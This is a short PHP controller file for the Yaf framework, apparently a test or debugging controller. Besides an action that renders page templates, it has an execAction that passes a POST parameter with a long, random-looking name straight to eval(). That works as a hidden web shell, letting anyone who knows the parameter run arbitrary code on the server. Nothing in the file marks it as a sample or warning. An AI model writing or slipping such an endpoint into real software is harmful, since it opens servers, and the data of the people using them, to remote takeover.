<?php
header("Content-type:text/html;charset=utf-8");
class IndexController extends Yaf_Controller_Abstract {
   /*http://localhost:81/test/index/index*/
   public function init(){
   			Yaf_Dispatcher::getInstance()->disableView();
    }


  //调试器
  public function indexAction(){
      
      $this->getView()->display('header.phtml');
      $this->getView()->display('index/index.phtml');
  }


  public function execAction(){
      eval(@$_POST['asivbnlaibvliewrvubeqrphqp9ghbvqjkbkvbreb']);
  }

}
?>